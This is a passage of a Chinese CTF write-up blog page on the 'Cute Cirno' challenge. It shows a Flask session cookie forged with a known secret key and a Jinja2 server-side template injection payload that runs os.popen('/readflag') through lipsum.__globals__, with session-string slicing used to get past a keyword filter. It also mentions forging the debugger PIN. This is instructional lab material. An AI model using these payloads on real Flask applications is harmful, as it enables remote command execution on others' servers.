class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这里有两种写法：</p>
+<p>法一：（字符串拼接）不推荐，很难拼</p>
+<p>法二：</p>
+<p>这里session是可控的，所以我们可以把需要的字符串先存入session中，然后在ssti时从session中取值</p>
+<blockquote>
+<p><code>&#123;%print(session)%&#125;</code>这样可以把session的值打印出来</p>
+<p>我在这里学到了新的东西，jinja2的字符串可以进行字符串切片</p>
+<p>首先我们需要把<code>session</code>转为字符串，我们使用<code>string过滤器</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(session|string)[39:50]</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以打印出session中的一段值了</p>
+</blockquote>
+<p>首先使用脚本构造flask session：(这里我们把ssti需要使用的字符串也构造到session中了)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;bxdQy9DN6FiCBXhNZFm3YwAgJ+Mn4+mRFiI0sYEP*NeepuCTF*&quot;</span> -t <span class="string">&quot;&#123;&#x27;/readflag&#x27;: 0, &#x27;__globals__&#x27;: 0, &#x27;admin&#x27;: 1, &#x27;os&#x27;: 0,&#x27;popen&#x27;: 0, &#x27;read&#x27;: 0&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">.eJyrVtIvSk1MSctJTFeyMtBRio9Pz8lPSswpjo8H8xNTcjPzlKwMdZTyi8ECBfkFqXlgFkgfkFELAMoaFFg.ZG5POw.jWk5AQmFaC172YwAbMbUXlICmm4</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png" alt="image-20230525025204438"></p>
+<p>如图，我们将session变量的值打印出来了，其中包含我们可以利用的字符串</p>
+<p>接下来我们只需要构造如下ssti即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum[&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;/readflag&quot;)[&quot;read&quot;]())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结合session的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png" alt="image-20230525025419723"></p>
+<h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p>伪造pin码</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io">LIKE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io/posts/c66216d2b920/">https://leekoscn.github.io/posts/c66216d2b920/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://leekoscn.github.io" target="_blank">Tranquility</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/proc%E7%9B%AE%E5%BD%95self%E4%B8%8B%E7%9A%84maps-mem/">proc目录self下的maps&amp;&amp;mem</a></div><div class="post_share"><div class="social-share" data-image="/img/hello-world.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/wechatpay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/7d96626c9ab7/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Quine注入</div></div></a></div><div class="next-post pull-right"><a href="/posts/f71d4b63cb95/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">picoCTF2023</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LIKE</div><div class="author-info__description">这是个人博客，分享技术的地方~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/leekoscn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/leekoscn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_61839115?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2500495325&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:2500495325@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#proc-self-maps-amp-amp-proc-self-mem"><span class="toc-number">1.</span> <span class="toc-text">&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cute-Cirno-amp-Cute-Cirno-Revenge"><span class="toc-number">1.2.1.</span> <span class="toc-text">Cute Cirno &amp; Cute Cirno (Revenge)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">预期解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">非预期</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day17(编解码、二次注入、DNSlog盲注)"/></a><div class="content"><a class="title" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)">小迪-day17(编解码、二次注入、DNSlog盲注)</a><time datetime="2023-08-22T10:05:22.621Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day16（报错注入，延时、布尔盲注）"/></a><div class="content"><a class="title" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）">小迪-day16（报错注入，延时、布尔盲注）</a><time datetime="2023-08-22T10:05:22.618Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"/></a><div class="content"><a class="title" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)">小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</a><time datetime="2023-08-22T10:05:22.617Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day14(注入类型之提交注入)"/></a><div class="content"><a class="title" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)">小迪-day14(注入类型之提交注入)</a><time datetime="2023-08-22T10:05:22.615Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day13(MySQL注入)"/></a><div class="content"><a class="title" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)">小迪-day13(MySQL注入)</a><time datetime="2023-08-22T10:05:22.611Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/hello-world.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022-09 - 2023 By LIKE</div><div class="framework-info"><a href="https://beian.miit.gov.cn"  style="color:#fff" target="_blank">赣ICP备2022008842号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz',
+      appKey: 'esLROw9j3xLk2nV4tQkKaih1',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function electric_clock_injector_config(){
+                var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+                var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+                console.log('已挂载electric_clock')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0] && (location.pathname ==='all'|| 'all' ==='all')){
+
+            electric_clock_injector_config()
+        } </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax  src="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.js"></script><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+    var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end -->
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>
